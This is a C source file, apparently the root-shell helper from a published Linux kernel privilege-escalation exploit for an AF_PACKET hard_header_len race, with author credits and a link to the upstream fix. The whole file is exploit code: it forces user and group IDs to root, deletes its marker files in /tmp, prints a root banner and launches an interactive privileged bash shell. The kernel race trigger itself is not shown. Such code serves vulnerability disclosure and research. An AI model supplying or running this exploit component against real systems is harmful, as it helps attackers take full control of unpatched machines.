// SPDX-License-Identifier: GPL-2.0-only
/*
 * Privilege proof helper for the Linux AF_PACKET hard_header_len race exploit.
 * Date: 2026-08-12
 * Exploit Author: A. Ramos <aramosf@gmail.com> (@aramosf)
 * Discovery and fix: Qihang Tang <q.h.hack.winter@gmail.com>
 * Upstream fix:
 * https://github.com/torvalds/linux/commit/03390aa32e669cc4ecd7d34108e2e1afc13d689d
 */

#define _GNU_SOURCE

#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

#define ROOT_SHELL_PATH "/tmp/packet-oob-rootsh"
#define ROOT_MARKER_PATH "/tmp/packet-oob-rooted"

int main(int argc, char **argv)
{
	(void)argc;
	(void)argv;

	if (setresgid(0, 0, 0) < 0) {
		perror("setresgid");
		return EXIT_FAILURE;
	}
	if (setresuid(0, 0, 0) < 0) {
		perror("setresuid");
		return EXIT_FAILURE;
	}
	if (unlink(ROOT_SHELL_PATH) < 0 && errno != ENOENT)
		perror("warning: unlink(root helper)");
	if (unlink(ROOT_MARKER_PATH) < 0 && errno != ENOENT)
		perror("warning: unlink(root marker)");
	printf("[ROOT] uid=%u euid=%u gid=%u egid=%u\n",
	       (unsigned int)getuid(), (unsigned int)geteuid(),
	       (unsigned int)getgid(), (unsigned int)getegid());
	printf("[ROOT] interactive initial-namespace shell ready\n");
	fflush(stdout);
	if (setenv("PS1",
		   "\\[\\e[1;31m\\]root@\\h\\[\\e[0m\\]:"
		   "\\[\\e[1;34m\\]\\w\\[\\e[0m\\]# "
		   "\\[\\e[38;5;250m\\]", 1) < 0) {
		perror("setenv(PS1)");
		return EXIT_FAILURE;
	}
	if (setenv("PS0", "\033[0m", 1) < 0) {
		perror("setenv(PS0)");
		return EXIT_FAILURE;
	}
	execl("/bin/bash", "bash", "--noprofile", "--norc", "-p", "-i",
	      (char *)NULL);
	perror("execl(/bin/bash)");
	return errno ? errno : EXIT_FAILURE;
}
